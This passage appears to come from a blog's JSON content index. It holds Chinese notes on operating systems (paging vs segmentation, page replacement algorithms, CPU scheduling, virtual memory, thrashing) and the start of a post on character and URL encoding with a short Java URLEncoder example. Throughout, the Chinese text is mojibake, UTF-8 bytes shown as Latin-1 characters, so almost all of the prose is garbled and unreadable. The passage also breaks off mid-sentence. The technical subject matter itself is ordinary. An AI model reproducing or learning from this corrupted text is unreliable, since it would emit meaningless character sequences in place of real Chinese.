ä¸ºæ®µå¤§å°å¯å˜ï¼Œæ”¹å˜æ®µå¤§å°æ¥æ¶ˆé™¤å†…ç¢ç‰‡ï¼‰ã€‚ä½†æ®µæ¢å…¥æ¢å‡ºæ—¶ï¼Œä¼šäº§ç”Ÿå¤–ç¢ç‰‡ï¼ˆæ¯”å¦‚4kçš„æ®µæ¢5kçš„æ®µï¼Œä¼šäº§ç”Ÿ1kçš„å¤–ç¢ç‰‡ï¼‰ é¡µå¼å­˜å‚¨ç®¡ç†æ–¹æ¡ˆæ˜¯ä¸€ç§ç”¨æˆ·è§†è§’å†…å­˜ä¸ç‰©ç†å†…å­˜ç›¸åˆ†ç¦»çš„å†…å­˜åˆ†é…ç®¡ç†æ–¹æ¡ˆã€‚åœ¨é¡µå¼å­˜å‚¨ç®¡ç†ä¸­ï¼Œå°†ç¨‹åºçš„é€»è¾‘åœ°å€åˆ’åˆ†ä¸ºå›ºå®šå¤§å°çš„é¡µï¼ˆpageï¼‰ï¼Œè€Œç‰©ç†å†…å­˜åˆ’åˆ†ä¸ºåŒæ ·å¤§å°çš„å¸§ï¼Œç¨‹åºåŠ è½½æ—¶ï¼Œå¯ä»¥å°†ä»»æ„ä¸€é¡µæ”¾å…¥å†…å­˜ä¸­ä»»æ„ä¸€ä¸ªå¸§ï¼Œè¿™äº›å¸§ä¸å¿…è¿ç»­ï¼Œä»è€Œå®ç°äº†ç¦»æ•£åˆ†é…ã€‚é¡µå¼å­˜å‚¨ç®¡ç†çš„ä¼˜ç‚¹æ˜¯ï¼šæ²¡æœ‰å¤–ç¢ç‰‡ï¼ˆå› ä¸ºé¡µçš„å¤§å°å›ºå®šï¼‰ï¼Œä½†ä¼šäº§ç”Ÿå†…ç¢ç‰‡ï¼ˆä¸€ä¸ªé¡µå¯èƒ½å¡«å……ä¸æ»¡ï¼‰ã€‚ ä¸¤è€…çš„ä¸åŒç‚¹ï¼š ç›®çš„ä¸åŒï¼šåˆ†é¡µæ˜¯ç”±äºç³»ç»Ÿç®¡ç†çš„éœ€è¦è€Œä¸æ˜¯ç”¨æˆ·çš„éœ€è¦ï¼Œå®ƒæ˜¯ä¿¡æ¯çš„ç‰©ç†å•ä½ï¼›åˆ†æ®µçš„ç›®çš„æ˜¯ä¸ºäº†èƒ½æ›´å¥½åœ°æ»¡è¶³ç”¨æˆ·çš„éœ€è¦ï¼Œå®ƒæ˜¯ä¿¡æ¯çš„é€»è¾‘å•ä½ï¼Œå®ƒå«æœ‰ä¸€ç»„å…¶æ„ä¹‰ç›¸å¯¹å®Œæ•´çš„ä¿¡æ¯ï¼› å¤§å°ä¸åŒï¼šé¡µçš„å¤§å°å›ºå®šä¸”ç”±ç³»ç»Ÿå†³å®šï¼Œè€Œæ®µçš„é•¿åº¦å´ä¸å›ºå®šï¼Œç”±å…¶æ‰€å®Œæˆçš„åŠŸèƒ½å†³å®šï¼› åœ°å€ç©ºé—´ä¸åŒï¼š æ®µå‘ç”¨æˆ·æä¾›äºŒç»´åœ°å€ç©ºé—´ï¼›é¡µå‘ç”¨æˆ·æä¾›çš„æ˜¯ä¸€ç»´åœ°å€ç©ºé—´ï¼› ä¿¡æ¯å…±äº«ï¼šæ®µæ˜¯ä¿¡æ¯çš„é€»è¾‘å•ä½ï¼Œä¾¿äºå­˜å‚¨ä¿æŠ¤å’Œä¿¡æ¯çš„å…±äº«ï¼Œé¡µçš„ä¿æŠ¤å’Œå…±äº«å—åˆ°é™åˆ¶ï¼› å†…å­˜ç¢ç‰‡ï¼šé¡µå¼å­˜å‚¨ç®¡ç†çš„ä¼˜ç‚¹æ˜¯æ²¡æœ‰å¤–ç¢ç‰‡ï¼ˆå› ä¸ºé¡µçš„å¤§å°å›ºå®šï¼‰ï¼Œä½†ä¼šäº§ç”Ÿå†…ç¢ç‰‡ï¼ˆä¸€ä¸ªé¡µå¯èƒ½å¡«å……ä¸æ»¡ï¼‰ï¼›è€Œæ®µå¼ç®¡ç†çš„ä¼˜ç‚¹æ˜¯æ²¡æœ‰å†…ç¢ç‰‡ï¼ˆå› ä¸ºæ®µå¤§å°å¯å˜ï¼Œæ”¹å˜æ®µå¤§å°æ¥æ¶ˆé™¤å†…ç¢ç‰‡ï¼‰ã€‚ä½†æ®µæ¢å…¥æ¢å‡ºæ—¶ï¼Œä¼šäº§ç”Ÿå¤–ç¢ç‰‡ï¼ˆæ¯”å¦‚4kçš„æ®µæ¢5kçš„æ®µï¼Œä¼šäº§ç”Ÿ1kçš„å¤–ç¢ç‰‡ï¼‰ã€‚ é¡µé¢ç½®æ¢ç®—æ³•æœ€ä½³ç½®æ¢ç®—æ³•OPTï¼šåªå…·æœ‰ç†è®ºæ„ä¹‰çš„ç®—æ³•ï¼Œç”¨æ¥è¯„ä»·å…¶ä»–é¡µé¢ç½®æ¢ç®—æ³•ã€‚ç½®æ¢ç­–ç•¥æ˜¯å°†å½“å‰é¡µé¢ä¸­åœ¨æœªæ¥æœ€é•¿æ—¶é—´å†…ä¸ä¼šè¢«è®¿é—®çš„é¡µç½®æ¢å‡ºå»ã€‚ å…ˆè¿›å…ˆå‡ºç½®æ¢ç®—æ³•FIFOï¼šç®€å•ç²—æš´çš„ä¸€ç§ç½®æ¢ç®—æ³•ï¼Œæ²¡æœ‰è€ƒè™‘é¡µé¢è®¿é—®é¢‘ç‡ä¿¡æ¯ã€‚æ¯æ¬¡æ·˜æ±°æœ€æ—©è°ƒå…¥çš„é¡µé¢ã€‚ æœ€è¿‘æœ€ä¹…æœªä½¿ç”¨ç®—æ³•LRUï¼šç®—æ³•èµ‹äºˆæ¯ä¸ªé¡µé¢ä¸€ä¸ªè®¿é—®å­—æ®µï¼Œç”¨æ¥è®°å½•ä¸Šæ¬¡é¡µé¢è¢«è®¿é—®åˆ°ç°åœ¨æ‰€ç»å†çš„æ—¶é—´tï¼Œæ¯æ¬¡ç½®æ¢çš„æ—¶å€™æŠŠtå€¼æœ€å¤§çš„é¡µé¢ç½®æ¢å‡ºå»(å®ç°æ–¹é¢å¯ä»¥é‡‡ç”¨å¯„å­˜å™¨æˆ–è€…æ ˆçš„æ–¹å¼å®ç°)ã€‚ æ—¶é’Ÿç®—æ³•clock(ä¹Ÿè¢«ç§°ä¸ºæ˜¯æœ€è¿‘æœªä½¿ç”¨ç®—æ³•NRU)ï¼šé¡µé¢è®¾ç½®ä¸€ä¸ªè®¿é—®ä½ï¼Œå¹¶å°†é¡µé¢é“¾æ¥ä¸ºä¸€ä¸ªç¯å½¢é˜Ÿåˆ—ï¼Œé¡µé¢è¢«è®¿é—®çš„æ—¶å€™è®¿é—®ä½è®¾ç½®ä¸º1ã€‚é¡µé¢ç½®æ¢çš„æ—¶å€™ï¼Œå¦‚æœå½“å‰æŒ‡é’ˆæ‰€æŒ‡é¡µé¢è®¿é—®ä¸ºä¸º0ï¼Œé‚£ä¹ˆç½®æ¢ï¼Œå¦åˆ™å°†å…¶ç½®ä¸º0ï¼Œå¾ªç¯ç›´åˆ°é‡åˆ°ä¸€ä¸ªè®¿é—®ä¸ºä½0çš„é¡µé¢ã€‚ æ”¹è¿›å‹Clockç®—æ³•ï¼šåœ¨Clockç®—æ³•çš„åŸºç¡€ä¸Šæ·»åŠ ä¸€ä¸ªä¿®æ”¹ä½ï¼Œæ›¿æ¢æ—¶æ ¹ç©¶è®¿é—®ä½å’Œä¿®æ”¹ä½ç»¼åˆåˆ¤æ–­ã€‚ä¼˜å…ˆæ›¿æ¢è®¿é—®ä½å’Œä¿®æ”¹ä½éƒ½æ˜¯0çš„é¡µé¢ï¼Œå…¶æ¬¡æ˜¯è®¿é—®ä½ä¸º0ä¿®æ”¹ä½ä¸º1çš„é¡µé¢ã€‚ LFUæœ€å°‘ä½¿ç”¨ç®—æ³•LFUï¼šè®¾ç½®å¯„å­˜å™¨è®°å½•é¡µé¢è¢«è®¿é—®æ¬¡æ•°ï¼Œæ¯æ¬¡ç½®æ¢çš„æ—¶å€™ç½®æ¢å½“å‰è®¿é—®æ¬¡æ•°æœ€å°‘çš„ã€‚ æ“ä½œç³»ç»Ÿä¸­è¿›ç¨‹è°ƒåº¦ç­–ç•¥ å…ˆæ¥å…ˆæœåŠ¡è°ƒåº¦ç®—æ³•FCFSï¼šé˜Ÿåˆ—å®ç°ï¼ŒéæŠ¢å ï¼Œå…ˆè¯·æ±‚CPUçš„è¿›ç¨‹å…ˆåˆ†é…åˆ°CPUï¼Œå¯ä»¥ä½œä¸ºä½œä¸šè°ƒåº¦ç®—æ³•ä¹Ÿå¯ä»¥ä½œä¸ºè¿›ç¨‹è°ƒåº¦ç®—æ³•ï¼›æŒ‰ä½œä¸šæˆ–è€…è¿›ç¨‹åˆ°è¾¾çš„å…ˆåé¡ºåºä¾æ¬¡è°ƒåº¦ï¼Œå¯¹äºé•¿ä½œä¸šæ¯”è¾ƒæœ‰åˆ©ï¼› æœ€çŸ­ä½œä¸šä¼˜å…ˆè°ƒåº¦ç®—æ³•SJFï¼šä½œä¸šè°ƒåº¦ç®—æ³•ï¼Œç®—æ³•ä»å°±ç»ªé˜Ÿåˆ—ä¸­é€‰æ‹©ä¼°è®¡æ—¶é—´æœ€çŸ­çš„ä½œä¸šè¿›è¡Œå¤„ç†ï¼Œç›´åˆ°å¾—å‡ºç»“æœæˆ–è€…æ— æ³•ç»§ç»­æ‰§è¡Œï¼Œå¹³å‡ç­‰å¾…æ—¶é—´æœ€çŸ­ï¼Œä½†éš¾ä»¥çŸ¥é“ä¸‹ä¸€ä¸ªCPUåŒºé—´é•¿åº¦ï¼›ç¼ºç‚¹ï¼šä¸åˆ©äºé•¿ä½œä¸šï¼›æœªè€ƒè™‘ä½œä¸šçš„é‡è¦æ€§ï¼›è¿è¡Œæ—¶é—´æ˜¯é¢„ä¼°çš„ï¼Œå¹¶ä¸é è°± ï¼› ä¼˜å…ˆçº§è°ƒåº¦ç®—æ³•(å¯ä»¥æ˜¯æŠ¢å çš„ï¼Œä¹Ÿå¯ä»¥æ˜¯éæŠ¢å çš„)ï¼šä¼˜å…ˆçº§è¶Šé«˜è¶Šå…ˆåˆ†é…åˆ°CPUï¼Œç›¸åŒä¼˜å…ˆçº§å…ˆåˆ°å…ˆæœåŠ¡ï¼Œå­˜åœ¨çš„ä¸»è¦é—®é¢˜æ˜¯ï¼šä½ä¼˜å…ˆçº§è¿›ç¨‹æ— ç©·ç­‰å¾…CPUï¼Œä¼šå¯¼è‡´æ— ç©·é˜»å¡æˆ–é¥¥é¥¿ï¼› æ—¶é—´ç‰‡è½®è½¬è°ƒåº¦ç®—æ³•(å¯æŠ¢å çš„)ï¼šæŒ‰åˆ°è¾¾çš„å…ˆåå¯¹è¿›ç¨‹æ”¾å…¥é˜Ÿåˆ—ä¸­ï¼Œç„¶åç»™é˜Ÿé¦–è¿›ç¨‹åˆ†é…CPUæ—¶é—´ç‰‡ï¼Œæ—¶é—´ç‰‡ç”¨å®Œä¹‹åè®¡æ—¶å™¨å‘å‡ºä¸­æ–­ï¼Œæš‚åœå½“å‰è¿›ç¨‹å¹¶å°†å…¶æ”¾åˆ°é˜Ÿåˆ—å°¾éƒ¨ï¼Œå¾ªç¯ ;é˜Ÿåˆ—ä¸­æ²¡æœ‰è¿›ç¨‹è¢«åˆ†é…è¶…è¿‡ä¸€ä¸ªæ—¶é—´ç‰‡çš„CPUæ—¶é—´ï¼Œé™¤éå®ƒæ˜¯å”¯ä¸€å¯è¿è¡Œçš„è¿›ç¨‹ã€‚å¦‚æœè¿›ç¨‹çš„CPUåŒºé—´è¶…è¿‡äº†ä¸€ä¸ªæ—¶é—´ç‰‡ï¼Œé‚£ä¹ˆè¯¥è¿›ç¨‹å°±è¢«æŠ¢å å¹¶æ”¾å›å°±ç»ªé˜Ÿåˆ—ã€‚ é«˜ç›¸åº”æ¯”ç®—æ³•HRNï¼šå“åº”æ¯”=(ç­‰å¾…æ—¶é—´+è¦æ±‚æœåŠ¡æ—¶é—´)/è¦æ±‚æœåŠ¡æ—¶é—´ï¼› å¤šçº§é˜Ÿåˆ—è°ƒåº¦ç®—æ³•ï¼šå°†å°±ç»ªé˜Ÿåˆ—åˆ†æˆå¤šä¸ªç‹¬ç«‹çš„é˜Ÿåˆ—ï¼Œæ¯ä¸ªé˜Ÿåˆ—éƒ½æœ‰è‡ªå·±çš„è°ƒåº¦ç®—æ³•ï¼Œé˜Ÿåˆ—ä¹‹é—´é‡‡ç”¨å›ºå®šä¼˜å…ˆçº§æŠ¢å è°ƒåº¦ã€‚å…¶ä¸­ï¼Œä¸€ä¸ªè¿›ç¨‹æ ¹æ®è‡ªèº«å±æ€§è¢«æ°¸ä¹…åœ°åˆ†é…åˆ°ä¸€ä¸ªé˜Ÿåˆ—ä¸­ã€‚ å¤šçº§åé¦ˆé˜Ÿåˆ—è°ƒåº¦ç®—æ³•ï¼šç›®å‰å…¬è®¤è¾ƒå¥½çš„è°ƒåº¦ç®—æ³•ï¼›è®¾ç½®å¤šä¸ªå°±ç»ªé˜Ÿåˆ—å¹¶ä¸ºæ¯ä¸ªé˜Ÿåˆ—è®¾ç½®ä¸åŒçš„ä¼˜å…ˆçº§ï¼Œç¬¬ä¸€ä¸ªé˜Ÿåˆ—ä¼˜å…ˆçº§æœ€é«˜ï¼Œå…¶ä½™ä¾æ¬¡é€’å‡ã€‚ä¼˜å…ˆçº§è¶Šé«˜çš„é˜Ÿåˆ—åˆ†é…çš„æ—¶é—´ç‰‡è¶ŠçŸ­ï¼Œè¿›ç¨‹åˆ°è¾¾ä¹‹åæŒ‰FCFSæ”¾å…¥ç¬¬ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå¦‚æœè°ƒåº¦æ‰§è¡Œåæ²¡æœ‰å®Œæˆï¼Œé‚£ä¹ˆæ”¾åˆ°ç¬¬äºŒä¸ªé˜Ÿåˆ—å°¾éƒ¨ç­‰å¾…è°ƒåº¦ï¼Œå¦‚æœç¬¬äºŒæ¬¡è°ƒåº¦ä»ç„¶æ²¡æœ‰å®Œæˆï¼Œæ”¾å…¥ç¬¬ä¸‰é˜Ÿåˆ—å°¾éƒ¨â€¦ã€‚åªæœ‰å½“å‰ä¸€ä¸ªé˜Ÿåˆ—ä¸ºç©ºçš„æ—¶å€™æ‰ä¼šå»è°ƒåº¦ä¸‹ä¸€ä¸ªé˜Ÿåˆ—çš„è¿›ç¨‹ã€‚ä¸å¤šçº§é˜Ÿåˆ—è°ƒåº¦ç®—æ³•ç›¸æ¯”ï¼Œå…¶å…è®¸è¿›ç¨‹åœ¨é˜Ÿåˆ—ä¹‹é—´ç§»åŠ¨ï¼šè‹¥è¿›ç¨‹ä½¿ç”¨è¿‡å¤šCPUæ—¶é—´ï¼Œé‚£ä¹ˆå®ƒä¼šè¢«è½¬ç§»åˆ°æ›´ä½çš„ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼›åœ¨è¾ƒä½ä¼˜å…ˆçº§é˜Ÿåˆ—ç­‰å¾…æ—¶é—´è¿‡é•¿çš„è¿›ç¨‹ä¼šè¢«è½¬ç§»åˆ°æ›´é«˜ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼Œä»¥é˜²æ­¢é¥¥é¥¿å‘ç”Ÿã€‚ è¿›ç¨‹åŒæ­¥æœ‰å“ªå‡ ç§æœºåˆ¶ åŸå­æ“ä½œã€ä¿¡å·é‡æœºåˆ¶ã€è‡ªæ—‹é”ç®¡ç¨‹ã€ä¼šåˆã€åˆ†å¸ƒå¼ç³»ç»Ÿ è™šæ‹Ÿå†…å­˜å†…å­˜çš„å‘å±•å†ç¨‹ æ²¡æœ‰å†…å­˜æŠ½è±¡(å•è¿›ç¨‹ï¼Œé™¤å»æ“ä½œç³»ç»Ÿæ‰€ç”¨çš„å†…å­˜ä¹‹å¤–ï¼Œå…¨éƒ¨ç»™ç”¨æˆ·ç¨‹åºä½¿ç”¨) â€”&gt; æœ‰å†…å­˜æŠ½è±¡ï¼ˆå¤šè¿›ç¨‹ï¼Œè¿›ç¨‹ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œäº¤æ¢æŠ€æœ¯(å†…å­˜å¤§å°ä¸å¯èƒ½å®¹çº³ä¸‹æ‰€æœ‰å¹¶å‘æ‰§è¡Œçš„è¿›ç¨‹)ï¼‰â€”&gt; è¿ç»­å†…å­˜åˆ†é…(å›ºå®šå¤§å°åˆ†åŒº(å¤šé“ç¨‹åºçš„ç¨‹åº¦å—é™)ï¼Œå¯å˜åˆ†åŒº(é¦–æ¬¡é€‚åº”ï¼Œæœ€ä½³é€‚åº”ï¼Œæœ€å·®é€‚åº”)ï¼Œç¢ç‰‡) â€”&gt; ä¸è¿ç»­å†…å­˜åˆ†é…ï¼ˆåˆ†æ®µï¼Œåˆ†é¡µï¼Œæ®µé¡µå¼ï¼Œè™šæ‹Ÿå†…å­˜ï¼‰ è™šæ‹Ÿå†…å­˜ è™šæ‹Ÿå†…å­˜å…è®¸æ‰§è¡Œè¿›ç¨‹ä¸å¿…å®Œå…¨åœ¨å†…å­˜ä¸­ã€‚è™šæ‹Ÿå†…å­˜çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šæ¯ä¸ªè¿›ç¨‹æ‹¥æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œè¿™ä¸ªç©ºé—´è¢«åˆ†ä¸ºå¤§å°ç›¸ç­‰çš„å¤šä¸ªå—ï¼Œç§°ä¸ºé¡µ(Page)ï¼Œæ¯ä¸ªé¡µéƒ½æ˜¯ä¸€æ®µè¿ç»­çš„åœ°å€ã€‚è¿™äº›é¡µè¢«æ˜ å°„åˆ°ç‰©ç†å†…å­˜ï¼Œä½†å¹¶ä¸æ˜¯æ‰€æœ‰çš„é¡µéƒ½å¿…é¡»åœ¨å†…å­˜ä¸­æ‰èƒ½è¿è¡Œç¨‹åºã€‚å½“ç¨‹åºå¼•ç”¨åˆ°ä¸€éƒ¨åˆ†åœ¨ç‰©ç†å†…å­˜ä¸­çš„åœ°å€ç©ºé—´æ—¶ï¼Œç”±ç¡¬ä»¶ç«‹åˆ»è¿›è¡Œå¿…è¦çš„æ˜ å°„ï¼›å½“ç¨‹åºå¼•ç”¨åˆ°ä¸€éƒ¨åˆ†ä¸åœ¨ç‰©ç†å†…å­˜ä¸­çš„åœ°å€ç©ºé—´æ—¶ï¼Œç”±æ“ä½œç³»ç»Ÿè´Ÿè´£å°†ç¼ºå¤±çš„éƒ¨åˆ†è£…å…¥ç‰©ç†å†…å­˜å¹¶é‡æ–°æ‰§è¡Œå¤±è´¥çš„å‘½ä»¤ã€‚è¿™æ ·ï¼Œå¯¹äºè¿›ç¨‹è€Œè¨€ï¼Œé€»è¾‘ä¸Šä¼¼ä¹æœ‰å¾ˆå¤§çš„å†…å­˜ç©ºé—´ï¼Œå®é™…ä¸Šå…¶ä¸­ä¸€éƒ¨åˆ†å¯¹åº”ç‰©ç†å†…å­˜ä¸Šçš„ä¸€å—(ç§°ä¸ºå¸§ï¼Œé€šå¸¸é¡µå’Œå¸§å¤§å°ç›¸ç­‰)ï¼Œè¿˜æœ‰ä¸€äº›æ²¡åŠ è½½åœ¨å†…å­˜ä¸­çš„å¯¹åº”åœ¨ç¡¬ç›˜ä¸Šï¼Œå¦‚å›¾æ‰€ç¤ºã€‚æ³¨æ„ï¼Œè¯·æ±‚åˆ†é¡µç³»ç»Ÿã€è¯·æ±‚åˆ†æ®µç³»ç»Ÿå’Œè¯·æ±‚æ®µé¡µå¼ç³»ç»Ÿéƒ½æ˜¯é’ˆå¯¹è™šæ‹Ÿå†…å­˜çš„ï¼Œé€šè¿‡è¯·æ±‚å®ç°å†…å­˜ä¸å¤–å­˜çš„ä¿¡æ¯ç½®æ¢ã€‚ ç”±å›¾å¯ä»¥çœ‹å‡ºï¼Œè™šæ‹Ÿå†…å­˜å®é™…ä¸Šå¯ä»¥æ¯”ç‰©ç†å†…å­˜å¤§ã€‚å½“è®¿é—®è™šæ‹Ÿå†…å­˜æ—¶ï¼Œä¼šè®¿é—®MMUï¼ˆå†…å­˜ç®¡ç†å•å…ƒï¼‰å»åŒ¹é…å¯¹åº”çš„ç‰©ç†åœ°å€ï¼ˆæ¯”å¦‚å›¾5çš„0ï¼Œ1ï¼Œ2ï¼‰ã€‚å¦‚æœè™šæ‹Ÿå†…å­˜çš„é¡µå¹¶ä¸å­˜åœ¨äºç‰©ç†å†…å­˜ä¸­ï¼ˆå¦‚å›¾5çš„3,4ï¼‰ï¼Œä¼šäº§ç”Ÿç¼ºé¡µä¸­æ–­ï¼Œä»ç£ç›˜ä¸­å–å¾—ç¼ºçš„é¡µæ”¾å…¥å†…å­˜ï¼Œå¦‚æœå†…å­˜å·²æ»¡ï¼Œè¿˜ä¼šæ ¹æ®æŸç§ç®—æ³•å°†ç£ç›˜ä¸­çš„é¡µæ¢å‡ºã€‚ è™šæ‹Ÿå†…å­˜çš„åº”ç”¨ä¸ä¼˜ç‚¹è™šæ‹Ÿå†…å­˜å¾ˆé€‚åˆåœ¨å¤šé“ç¨‹åºè®¾è®¡ç³»ç»Ÿä¸­ä½¿ç”¨ï¼Œè®¸å¤šç¨‹åºçš„ç‰‡æ®µåŒæ—¶ä¿å­˜åœ¨å†…å­˜ä¸­ã€‚å½“ä¸€ä¸ªç¨‹åºç­‰å¾…å®ƒçš„ä¸€éƒ¨åˆ†è¯»å…¥å†…å­˜æ—¶ï¼Œå¯ä»¥æŠŠCPUäº¤ç»™å¦ä¸€ä¸ªè¿›ç¨‹ä½¿ç”¨ã€‚è™šæ‹Ÿå†…å­˜çš„ä½¿ç”¨å¯ä»¥å¸¦æ¥ä»¥ä¸‹å¥½å¤„ï¼š åœ¨å†…å­˜ä¸­å¯ä»¥ä¿ç•™å¤šä¸ªè¿›ç¨‹ï¼Œç³»ç»Ÿå¹¶å‘åº¦æé«˜ è§£é™¤äº†ç”¨æˆ·ä¸å†…å­˜ä¹‹é—´çš„ç´§å¯†çº¦æŸï¼Œè¿›ç¨‹å¯ä»¥æ¯”å†…å­˜çš„å…¨éƒ¨ç©ºé—´è¿˜å¤§ é¢ ç°¸é¢ ç°¸æœ¬è´¨ä¸Šæ˜¯æŒ‡é¢‘ç¹çš„é¡µè°ƒåº¦è¡Œä¸ºï¼Œå…·ä½“æ¥è®²ï¼Œè¿›ç¨‹å‘ç”Ÿç¼ºé¡µä¸­æ–­ï¼Œè¿™æ—¶ï¼Œå¿…é¡»ç½®æ¢æŸä¸€é¡µã€‚ç„¶è€Œï¼Œå…¶ä»–æ‰€æœ‰çš„é¡µéƒ½åœ¨ä½¿ç”¨ï¼Œå®ƒç½®æ¢ä¸€ä¸ªé¡µï¼Œä½†åˆç«‹åˆ»å†æ¬¡éœ€è¦è¿™ä¸ªé¡µã€‚å› æ­¤ï¼Œä¼šä¸æ–­äº§ç”Ÿç¼ºé¡µä¸­æ–­ï¼Œå¯¼è‡´æ•´ä¸ªç³»ç»Ÿçš„æ•ˆç‡æ€¥å‰§ä¸‹é™ï¼Œè¿™ç§ç°è±¡ç§°ä¸ºé¢ ç°¸ï¼ˆæŠ–åŠ¨ï¼‰ã€‚ å†…å­˜é¢ ç°¸çš„è§£å†³ç­–ç•¥åŒ…æ‹¬ï¼š å¦‚æœæ˜¯å› ä¸ºé¡µé¢æ›¿æ¢ç­–ç•¥å¤±è¯¯ï¼Œå¯ä»¥ä¿®æ”¹æ›¿æ¢ç®—æ³•æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼› å¦‚æœæ˜¯å› ä¸ºè¿è¡Œçš„ç¨‹åºå¤ªå¤šï¼Œé€ æˆç¨‹åºæ— æ³•åŒæ—¶å°†æ‰€æœ‰é¢‘ç¹è®¿é—®çš„é¡µé¢è°ƒå…¥å†…å­˜ï¼Œåˆ™è¦é™ä½å¤šé“ç¨‹åºçš„æ•°é‡ï¼› å¦åˆ™ï¼Œè¿˜å‰©ä¸‹ä¸¤ä¸ªåŠæ³•ï¼šç»ˆæ­¢è¯¥è¿›ç¨‹æˆ–å¢åŠ ç‰©ç†å†…å­˜å®¹é‡ã€‚ å±€éƒ¨æ€§åŸç†æ—¶é—´ä¸Šçš„å±€éƒ¨æ€§ï¼šæœ€è¿‘è¢«è®¿é—®çš„é¡µåœ¨ä¸ä¹…çš„å°†æ¥è¿˜ä¼šè¢«è®¿é—®ï¼› ç©ºé—´ä¸Šçš„å±€éƒ¨æ€§ï¼šå†…å­˜ä¸­è¢«è®¿é—®çš„é¡µå‘¨å›´çš„é¡µä¹Ÿå¾ˆå¯èƒ½è¢«è®¿é—®ã€‚","categories":[],"tags":[{"name":"Operating Systems","slug":"Operating-Systems","permalink":"https://blog.kayleh.top/tags/Operating-Systems/"}]},{"title":"encoding-algorithm","slug":"ç¼–ç ç®—æ³•","date":"2020-06-18T16:53:22.000Z","updated":"2021-04-11T17:11:29.001Z","comments":true,"path":"ç¼–ç ç®—æ³•/","link":"","permalink":"https://blog.kayleh.top/%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/","excerpt":"ç¼–ç ç®—æ³•","text":"ç¼–ç ç®—æ³• è¦å­¦ä¹ ç¼–ç ç®—æ³•ï¼Œå…ˆæ¥çœ‹ä¸€çœ‹ä»€ä¹ˆæ˜¯ç¼–ç ã€‚ ASCIIç å°±æ˜¯ä¸€ç§ç¼–ç ï¼Œå­—æ¯Açš„ç¼–ç æ˜¯åå…­è¿›åˆ¶çš„0x41ï¼Œå­—æ¯Bæ˜¯0x42ï¼Œä»¥æ­¤ç±»æ¨ï¼š å­—æ¯ ASCIIç¼–ç  A 0x41 B 0x42 C 0x43 D 0x44 â€¦ â€¦ å› ä¸ºASCIIç¼–ç æœ€å¤šåªèƒ½æœ‰127ä¸ªå­—ç¬¦ï¼Œè¦æƒ³å¯¹æ›´å¤šçš„æ–‡å­—è¿›è¡Œç¼–ç ï¼Œå°±éœ€è¦ç”¨Unicodeã€‚è€Œä¸­æ–‡çš„ä¸­ä½¿ç”¨Unicodeç¼–ç å°±æ˜¯0x4e2dï¼Œä½¿ç”¨UTF-8åˆ™éœ€è¦3ä¸ªå­—èŠ‚ç¼–ç ï¼š æ±‰å­— Unicodeç¼–ç  UTF-8ç¼–ç  ä¸­ 0x4e2d 0xe4b8ad æ–‡ 0x6587 0xe69687 ç¼– 0x7f16 0xe7bc96 ç  0x7801 0xe7a081 â€¦ â€¦ â€¦ å› æ­¤ï¼Œæœ€ç®€å•çš„ç¼–ç æ˜¯ç›´æ¥ç»™æ¯ä¸ªå­—ç¬¦æŒ‡å®šä¸€ä¸ªè‹¥å¹²å­—èŠ‚è¡¨ç¤ºçš„æ•´æ•°ï¼Œå¤æ‚ä¸€ç‚¹çš„ç¼–ç å°±éœ€è¦æ ¹æ®ä¸€ä¸ªå·²æœ‰çš„ç¼–ç æ¨ç®—å‡ºæ¥ã€‚ æ¯”å¦‚UTF-8ç¼–ç ï¼Œå®ƒæ˜¯ä¸€ç§ä¸å®šé•¿ç¼–ç ï¼Œä½†å¯ä»¥ä»ç»™å®šå­—ç¬¦çš„Unicodeç¼–ç æ¨ç®—å‡ºæ¥ã€‚ URLç¼–ç URLç¼–ç æ˜¯æµè§ˆå™¨å‘é€æ•°æ®ç»™æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„ç¼–ç ï¼Œå®ƒé€šå¸¸é™„åŠ åœ¨URLçš„å‚æ•°éƒ¨åˆ†ï¼Œä¾‹å¦‚ï¼š https://www.baidu.com/s?wd=%E4%B8%AD%E6%96%87 ä¹‹æ‰€ä»¥éœ€è¦URLç¼–ç ï¼Œæ˜¯å› ä¸ºå‡ºäºå…¼å®¹æ€§è€ƒè™‘ï¼Œå¾ˆå¤šæœåŠ¡å™¨åªè¯†åˆ«ASCIIå­—ç¬¦ã€‚ä½†å¦‚æœURLä¸­åŒ…å«ä¸­æ–‡ã€æ—¥æ–‡è¿™äº›éASCIIå­—ç¬¦æ€ä¹ˆåŠï¼Ÿä¸è¦ç´§ï¼ŒURLç¼–ç æœ‰ä¸€å¥—è§„åˆ™ï¼š å¦‚æœå­—ç¬¦æ˜¯A~Zï¼Œa~zï¼Œ0~9ä»¥åŠ-ã€_ã€.ã€*ï¼Œåˆ™ä¿æŒä¸å˜ï¼› å¦‚æœæ˜¯å…¶ä»–å­—ç¬¦ï¼Œå…ˆè½¬æ¢ä¸ºUTF-8ç¼–ç ï¼Œç„¶åå¯¹æ¯ä¸ªå­—èŠ‚ä»¥%XXè¡¨ç¤ºã€‚ ä¾‹å¦‚ï¼šå­—ç¬¦ä¸­çš„UTF-8ç¼–ç æ˜¯0xe4b8adï¼Œå› æ­¤ï¼Œå®ƒçš„URLç¼–ç æ˜¯%E4%B8%ADã€‚URLç¼–ç æ€»æ˜¯å¤§å†™ã€‚ Javaæ ‡å‡†åº“æä¾›äº†ä¸€ä¸ªURLEncoderç±»æ¥å¯¹ä»»æ„å­—ç¬¦ä¸²è¿›è¡ŒURLç¼–ç ï¼š public class Main { public static void main(String[] args) { String encoded = URLEncoder.encode(&quot;ä¸­æ–‡!&quot;, StandardCharsets.UTF_8); System.out.println(encoded); } } ä¸Šè¿°ä»£ç çš„è¿è¡Œç»“æœæ˜¯%E4%B8%AD%E6%96%87%21ï¼Œä¸­çš„URLç¼–ç æ˜¯%E4%B8%ADï¼Œæ–‡çš„URLç¼–ç æ˜¯%E6%96%87ï¼Œ!è™½ç„¶æ˜¯ASCIIå­—ç¬¦ï¼Œä¹Ÿè¦å¯¹å…¶ç¼–ç ä¸º%21ã€‚ å’Œæ ‡å‡†çš„URLç¼–ç ç¨æœ‰ä¸åŒï¼ŒURLEncoderæŠŠç©ºæ ¼å­—ç¬¦ç¼–ç æˆ+ï¼Œè€Œç°åœ¨çš„URLç¼–ç æ 